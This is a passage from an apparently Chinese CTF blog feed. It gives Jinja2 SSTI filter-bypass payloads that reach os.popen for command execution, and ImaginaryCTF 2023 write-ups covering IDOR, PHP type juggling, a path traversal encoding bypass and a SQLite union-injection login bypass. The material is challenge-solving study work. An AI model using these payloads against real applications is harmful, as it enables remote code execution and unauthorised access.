class="hljs-name">&quot;\x5f\x5fsubclasses\x5f\x5f&quot;</span>)()|attr(<span class="hljs-name">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="hljs-name">147</span>)|attr(<span class="hljs-name">&quot;\x5f\x5finit\x5f\x5f&quot;</span>)|attr(<span class="hljs-name">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>)|attr(<span class="hljs-name">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="hljs-name">&#x27;popen&#x27;</span>)(<span class="hljs-name">&#x27;type flag&#x27;</span>)|attr(<span class="hljs-name">&quot;read&quot;</span>)()&#125;&#125;</span><span class="language-xml"> </span><br></code></pre></td></tr></table></figure>这次倒是正常出现flag了## level 7过滤了“.”利用“[]”绕过payload:<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>[<span class="hljs-string">&#x27;__class__&#x27;</span>][<span class="hljs-string">&#x27;__base__&#x27;</span>][<span class="hljs-string">&#x27;__subclasses__&#x27;</span>]()[<span class="hljs-number">147</span>][<span class="hljs-string">&#x27;__init__&#x27;</span>][<span class="hljs-string">&#x27;__globals__&#x27;</span>][<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;type flag&#x27;</span>)[<span class="hljs-string">&#x27;read&#x27;</span>]()&#125;&#125;<br></code></pre></td></tr></table></figure>单引号改()显示no this level## level 8过滤关键字：class arg form value data request init global open mro base attr方法如下：<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs prolog"><span class="hljs-number">1.</span>字符串拼接<br><span class="hljs-string">&#x27;&#x27;</span>[<span class="hljs-string">&#x27;__clas&#x27;</span><span class="hljs-string">&#x27;s__&#x27;</span>][<span class="hljs-string">&#x27;__ba&#x27;</span><span class="hljs-string">&#x27;se__&#x27;</span>][<span class="hljs-string">&#x27;__subc&#x27;</span><span class="hljs-string">&#x27;lasses__&#x27;</span>]()[<span class="hljs-number">147</span>][<span class="hljs-string">&#x27;__in&#x27;</span><span class="hljs-string">&#x27;it__&#x27;</span>][<span class="hljs-string">&#x27;__glo&#x27;</span><span class="hljs-string">&#x27;bals__&#x27;</span>][<span class="hljs-string">&#x27;po&#x27;</span><span class="hljs-string">&#x27;pen&#x27;</span>](<span class="hljs-string">&#x27;type flag&#x27;</span>)[<span class="hljs-string">&#x27;read&#x27;</span>]()<br>或：<br>&#123;<span class="hljs-comment">%set a=&quot;__cla&quot;%&#125;&#123;%set aa=&quot;ss__%&#125;&#123;&#123;a~aa&#125;&#125;</span><br><span class="hljs-number">2.</span>使用过滤器，如join()拼接字符串、reverse()反转字符串、replace()替换字符<br><span class="hljs-number">3.</span>编码<br></code></pre></td></tr></table></figure>## level 9过滤数字方法1：使用getitem避免索引方法2；使用过滤器length()将字符长度转换为数字<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].eval(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endfor</span> <span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure>## level 10过滤config，没有全局变量，目标变为获取config文件可使用变量current_appcurrent_app：允许在应用程序上下文之外访问应用程序对象，如当前请求的应用程序实例。通过current_app变量，可以访问Flask应用程序对象的各种属性和方法，如配置信息、扩展和插件等。payload:<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">get_flashed_messages.__globals__</span>[&#x27;current_app&#x27;].config&#125;&#125;</span><br></code></pre></td></tr></table></figure>关于url_for方法：定位，如返回`<class 'str'>`关于get_flashed_message：可显示字符返回信息，需调用flash()## level 11过滤“\”，“+”，“request”，“[ ]”，“" '”引号过滤：`&#123;%set a=dict(__cla=a,ss__=b)|join%&#125;&#123;&#123;()|attr(a)&#125;&#125;</code></p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="language-xml">原构造链：</span><br><span class="language-xml">().__class__.__base__.__subclasses__()[139].__init__.__globals__[&#x27;popen&#x27;](&#x27;type flag&#x27;).read()</span><br><span class="language-xml"></span><br><span class="language-xml">payload：</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> a=dict(__cla=a,ss__=b)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"># __class__</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> b=dict(__bas=a,e__=b)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"># __base__</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> c=dict(__subcla=a,sses__=b)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"># __subclasses__</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> d=dict(__ge=a,titem__=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"># __getitem__</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> e=dict(__in=a,it__=b)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"># __init__</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> f=dict(__glo=a,bals__=b)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"># __globals__</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> g=dict(pop=a,en=b)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"># popen</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> h=self<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span>attr(d)(<span class="hljs-number">18</span>)<span class="hljs-template-tag">%&#125;</span><span class="language-xml"># 空格</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> i=(dict(type=abc)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>,h,dict(flag=b)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"># type flag</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> j=dict(read=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"># read</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-punctuation">|</span>attr(a)<span class="hljs-punctuation">|</span>attr(b)<span class="hljs-punctuation">|</span>attr(c)()<span class="hljs-punctuation">|</span>attr(d)(<span class="hljs-number">139</span>)<span class="hljs-punctuation">|</span>attr(e)<span class="hljs-punctuation">|</span>attr(f)<span class="hljs-punctuation">|</span>attr(d)(g)(i)<span class="hljs-punctuation">|</span>attr(j)()&#125;&#125;</span><span class="language-xml"># 拼接</span><br></code></pre></td></tr></table></figure><h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><p>过滤“_”，“.” ，“\” “’ “”，“[ ]”和数字<br>构造链：<code>&#123;&#123;x.__init__.__globals__['__builtins__']&#125;&#125;</code></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">payload:</span><br><span class="language-xml">get:</span><br><span class="language-xml">?z=__init__&amp;zz=__globals__&amp;zzz=__builtins__&amp;zzzz=eval&amp;zzzzz=__import__(&#x27;os&#x27;).popen(&#x27;type flag&#x27;).read()</span><br><span class="language-xml">post:</span><br><span class="language-xml">&#123;%set a=&#123;&#125;|select|string|list%&#125;</span><br><span class="language-xml">&#123;%set b=dict(pop=a)|join%&#125;</span><br><span class="language-xml">&#123;%set c=a|attr(b)(self|string|length)%&#125;  </span><br><span class="language-xml">&#123;%set d=(c,c,dict(getitem=a)|join,c,c)|join%&#125; </span><br><span class="language-xml">&#123;%set e=dict(args=a)|join%&#125;   </span><br><span class="language-xml">&#123;%set f=dict(get=a)|join%&#125;    </span><br><span class="language-xml">&#123;%set g=dict(z=a)|join%&#125;        </span><br><span class="language-xml">&#123;%set gg=dict(zz=a)|join%&#125;</span><br><span class="language-xml">&#123;%set ggg=dict(zzz=a)|join%&#125;</span><br><span class="language-xml">&#123;%set gggg=dict(zzzz=a)|join%&#125;</span><br><span class="language-xml">&#123;%set ggggg=dict(zzzzz=a)|join%&#125;</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">x</span>|attr(<span class="hljs-name">request</span>|attr(<span class="hljs-name">e</span>)|attr(<span class="hljs-name">f</span>)(<span class="hljs-name">g</span>))|attr(<span class="hljs-name">request</span>|attr(<span class="hljs-name">e</span>)|attr(<span class="hljs-name">f</span>)(<span class="hljs-name">gg</span>))|attr(<span class="hljs-name">d</span>)(<span class="hljs-name">request</span>|attr(<span class="hljs-name">e</span>)|attr(<span class="hljs-name">f</span>)(<span class="hljs-name">ggg</span>))|attr(<span class="hljs-name">d</span>)(<span class="hljs-name">request</span>|attr(<span class="hljs-name">e</span>)|attr(<span class="hljs-name">f</span>)(<span class="hljs-name">gggg</span>))(<span class="hljs-name">request</span>|attr(<span class="hljs-name">e</span>)|attr(<span class="hljs-name">f</span>)(<span class="hljs-name">ggggg</span>))&#125;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h2><p>过滤：’_’, ‘.’, ‘\’, ‘’’, ‘“’, ‘request’, ‘+’, ‘class’, ‘init’, ‘arg’, ‘config’, ‘app’, ‘self’, ‘[’, ‘]’</p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="hljs-template-tag">&#123;%<span class="hljs-name">set</span> a=&#123;&#125;|select|string|list%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%<span class="hljs-name">set</span> ax=&#123;&#125;|select|string|list%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%<span class="hljs-name">set</span> aa=dict(ssss=a)|<span class="hljs-name">join</span>%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%<span class="hljs-name">set</span> aaa=dict(ssssss=a)|<span class="hljs-name">join</span>%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%<span class="hljs-name">set</span> aaaa=dict(ss=a)|<span class="hljs-name">join</span>%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%<span class="hljs-name">set</span> aaaaa=dict(sssss=a)|<span class="hljs-name">join</span>%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%<span class="hljs-name">set</span> b=dict(pop=a)|<span class="hljs-name">join</span>%&#125;</span><span class="language-xml">   # pop</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%<span class="hljs-name">set</span> c=a|attr(b)(aa|<span class="hljs-name">length</span>*aaa|<span class="hljs-name">length</span>)%&#125;</span><span class="language-xml">  # _</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%<span class="hljs-name">set</span> cc=a|attr(b)(aaaa|<span class="hljs-name">length</span>*aaaaa|<span class="hljs-name">length</span>)%&#125;</span><span class="language-xml"> # 空格</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%<span class="hljs-name">set</span> d=(c,c,dict(get=a,item=a)|<span class="hljs-name">join</span>,c,c)|<span class="hljs-name">join</span>%&#125;</span><span class="language-xml">  # __getitem__</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%<span class="hljs-name">set</span> dd=(c,c,dict(<span class="hljs-keyword">in</span>=a,it=a)|<span class="hljs-name">join</span>,c,c)|<span class="hljs-name">join</span>%&#125;</span><span class="language-xml">   # __init__</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%<span class="hljs-name">set</span> ddd=(c,c,dict(glob=a,als=a)|<span class="hljs-name">join</span>,c,c)|<span class="hljs-name">join</span>%&#125;</span><span class="language-xml">   # __globals__</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%<span class="hljs-name">set</span> dddd=(c,c,dict(buil=a,tins=a)|<span class="hljs-name">join</span>,c,c)|<span class="hljs-name">join</span>%&#125;</span><span class="language-xml">   # __builtins__</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%<span class="hljs-name">set</span> e=(c,c,dict(impo=a,rt=a)|<span class="hljs-name">join</span>,c,c)|<span class="hljs-name">join</span>%&#125;</span><span class="language-xml">   # __import__</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%<span class="hljs-name">set</span> ee=(dict(o=a,s=a)|<span class="hljs-name">join</span>)|<span class="hljs-name">join</span>%&#125;</span><span class="language-xml">   # os</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%<span class="hljs-name">set</span> eee=(dict(po=a,pen=a)|<span class="hljs-name">join</span>)|<span class="hljs-name">join</span>%&#125;</span><span class="language-xml">  # popen</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%<span class="hljs-name">set</span> eeee=(dict(type=a)|<span class="hljs-name">join</span>,cc,dict(flag=a)|<span class="hljs-name">join</span>)|<span class="hljs-name">join</span>%&#125;</span><span class="language-xml">  # type flag</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%<span class="hljs-name">set</span> f=(dict(rea=a,d=a)|<span class="hljs-name">join</span>)|<span class="hljs-name">join</span>%&#125;</span><span class="language-xml">  # read</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;x|attr(dd)|attr(ddd)|attr(d)(dddd)|attr(d)(e)(ee)|attr(eee)(eeee)|attr(f)()&#125;&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2023/7/28：ImaginaryCTF2023记录</title>
    <link href="/2023/07/28/ImaginaryCTF2023/"/>
    <url>/2023/07/28/ImaginaryCTF2023/</url>
    
    <content type="html"><![CDATA[<h2 id="写出来的"><a href="#写出来的" class="headerlink" title="写出来的"></a>写出来的</h2><h3 id="Idoriot"><a href="#Idoriot" class="headerlink" title="Idoriot"></a>Idoriot</h3><p>1.这题一开始给了一个登录界面，先点击下面连接跳转到注册界面<br>2.先随便输入点啥在username和password里<br>3.注册完成后会显示题目的源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">...<br><span class="hljs-variable">$admin</span> = <span class="hljs-variable">$db</span>-&gt;query(<span class="hljs-string">&#x27;SELECT * FROM users WHERE user_id = 0 LIMIT 1&#x27;</span>)-&gt;fetch();<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$admin</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>] === <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>]) &#123;<br>   <span class="hljs-variable">$flag</span> = file_get_contents(<span class="hljs-string">&#x27;flag.txt&#x27;</span>);<br>   <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;Flag&lt;/h1&gt;&quot;</span>;<br>   <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;p&gt;<span class="hljs-variable">$flag</span>&lt;/p&gt;&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span> ...<br></code></pre></td></tr></table></figure><p>以上为关于flag的判断，需要在发起新会话时让user_id=0<br>4.先进入logout.php退出登录，F12查看源码</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;input <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;user_id&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;310702386&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>题目会随机给个id<br>5.用hackbar在注册界面传参：username=222222&amp;password=1&amp;user_id=0<br>6.获得flag:ictf{1ns3cure_direct_object_reference_from_hidden_post_param_i_guess}</p><h3 id="idoriot-revenge"><a href="#idoriot-revenge" class="headerlink" title="idoriot-revenge"></a>idoriot-revenge</h3><p>1.这题作为上面那题的修改，刚开始的流程相同，先查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$admin</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&#x27;SELECT * FROM users WHERE username = &quot;admin&quot; LIMIT 1&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$user_id</span> = (<span class="hljs-keyword">int</span>) <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$user_id</span> == <span class="hljs-string">&quot;php&quot;</span> &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$admin</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>])) &#123;<br>        <span class="hljs-comment">// Read the flag from flag.txt</span><br>        <span class="hljs-variable">$flag</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;Flag&lt;/h1&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;<span class="hljs-subst">$flag</span>&lt;/p&gt;&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>告诉我们user_id会用get传参，且强制转换为int型后再与字符串比较，当int为0时相等<br>之后还要满足发起会话时username=/admin/<br>2.先注册个username=/admin/的账号，之后在url中修改user_id=0<br>3.flag:ictf{this_ch4lleng3_creator_1s_really_an_idoriot}</p><h2 id="没写出来的"><a href="#没写出来的" class="headerlink" title="没写出来的"></a>没写出来的</h2><p>后来看别人的wp</p><h3 id="roks"><a href="#roks" class="headerlink" title="roks"></a>roks</h3><p>查看源码，通过Dockerfile得知flag.png与image在一个目录下，点击主界面按钮得知会随机展示一张从image来的图片，解码后会检测传入的内容是否含有“/”和“.”，再拼接文件路径</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>]);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">str_contains</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;/&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-title function_ invoke__">str_contains</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;.&quot;</span>)) &#123;<br><span class="hljs-variable">$contentType</span> = <span class="hljs-title function_ invoke__">mime_content_type</span>(<span class="hljs-string">&quot;stopHacking.png&quot;</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type: <span class="hljs-subst">$contentType</span>&quot;</span>);<br><span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-string">&quot;stopHacking.png&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$filePath</span> = <span class="hljs-string">&quot;images/&quot;</span> . <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$filename</span>);<br><span class="hljs-variable">$contentType</span> = <span class="hljs-title function_ invoke__">mime_content_type</span>(<span class="hljs-variable">$filePath</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type: <span class="hljs-subst">$contentType</span>&quot;</span>);<br><span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$filePath</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>瞎了，没看到拼接时还会再解码，二次编码无法通过三次行</p><h3 id="blank"><a href="#blank" class="headerlink" title="blank"></a>blank</h3><p>sql注入，但是sqlite3，部分语句与mysql不同</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">...........<br>app.get(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-function"><span class="hljs-params">(req, res)</span> =&gt;</span> &#123;<br>    res.render(<span class="hljs-string">&#x27;login&#x27;</span>);<br>&#125;);<br><br>app.post(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-function"><span class="hljs-params">(req, res)</span> =&gt;</span> &#123;<br>    const username = req.body.username;<br>    const password = req.body.password;<br><br>    db.get(<span class="hljs-string">&#x27;SELECT * FROM users WHERE username = &quot;&#x27;</span> + username + <span class="hljs-string">&#x27;&quot; and password = &quot;&#x27;</span> + password+ <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-function"><span class="hljs-params">(err, row)</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (err) &#123;<br>        console.<span class="hljs-built_in">error</span>(err);<br>        res.status(<span class="hljs-number">500</span>).send(<span class="hljs-string">&#x27;Error retrieving user&#x27;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (row) &#123;<br>            req.session.loggedIn = <span class="hljs-literal">true</span>;<br>            req.session.username = username;<br>            res.send(<span class="hljs-string">&#x27;Login successful!&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.status(<span class="hljs-number">401</span>).send(<span class="hljs-string">&#x27;Invalid username or password&#x27;</span>);<br>            &#125;<br>        &#125;<br>    &#125;);<br>&#125;);<br>..........<br>app.get(<span class="hljs-string">&#x27;/flag&#x27;</span>, <span class="hljs-function"><span class="hljs-params">(req, res)</span> =&gt;</span> &#123;<br><span class="hljs-keyword">if</span> (req.session.username == <span class="hljs-string">&quot;admin&quot;</span>) &#123;<br>    res.send(<span class="hljs-string">&#x27;Welcome admin. The flag is &#x27;</span> + fs.readFileSync(<span class="hljs-string">&#x27;flag.txt&#x27;</span>,<br><span class="hljs-string">&#x27;utf8&#x27;</span>));<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (req.session.loggedIn) &#123;<br>        res.status(<span class="hljs-number">401</span>).send(<span class="hljs-string">&#x27;You must be admin to get the flag.&#x27;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        res.status(<span class="hljs-number">401</span>).send(<span class="hljs-string">&#x27;Unauthorized. Please login first.&#x27;</span>);<br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>原代码检查是否为admin的password，不报错即可</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">password</span><span class="hljs-operator">=</span>a<span class="hljs-string">&quot;union select 1,2,3/*&amp;username=admin</span><br></code></pre></td></tr></table></figure><h3 id="Perfect-Picture"><a href="#Perfect-Picture" class="headerlink" title="Perfect Picture"></a>Perfect Picture</h3><p>关键代码：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">def</span> check(uploaded_image):<br>    <span class="hljs-attribute">with</span> open(&#x27;flag.txt&#x27;, &#x27;r&#x27;) as f:<br>        <span class="hljs-attribute">flag</span> = f.read()<br>    <span class="hljs-attribute">with</span> Image.open(app.config[&#x27;UPLOAD_FOLDER&#x27;] + uploaded_image) as image:<br>        <span class="hljs-attribute">w</span>, h = image.size<br>        <span class="hljs-attribute">if</span> w != <span class="hljs-number">690</span> or h != <span class="hljs-number">420</span>:<br>            <span class="hljs-attribute">return</span> <span class="hljs-number">0</span><br>        <span class="hljs-attribute">if</span> image.getpixel((<span class="hljs-number">412</span>, <span class="hljs-number">309</span>)) != (<span class="hljs-number">52</span>, <span class="hljs-number">146</span>, <span class="hljs-number">235</span>, <span class="hljs-number">123</span>):<br>            <span class="hljs-attribute">return</span> <span class="hljs-number">0</span><br>        <span class="hljs-attribute">if</span> image.getpixel((<span class="hljs-number">12</span>, <span class="hljs-number">209</span>)) != (<span 